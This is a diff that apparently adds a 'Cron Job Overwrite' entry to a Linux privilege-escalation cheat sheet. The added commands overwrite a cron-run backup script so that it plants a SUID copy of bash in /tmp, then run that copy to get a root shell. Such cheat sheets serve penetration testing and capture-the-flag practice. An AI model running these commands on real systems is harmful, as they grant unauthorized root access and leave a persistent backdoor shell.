@@ -1731,6 +1731,20 @@ $ ls /etc/cron.d
 $ ls /var/spool/cron/crontabs/root
 ```
 
+- Cron Job Overwrite
+
+```
+cat > /ftp/backup.sh << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+
+ls -la /tmp/rootbash
+/tmp/rootbash -p
+id  
+```
+
 - Disk Group
 
 ```
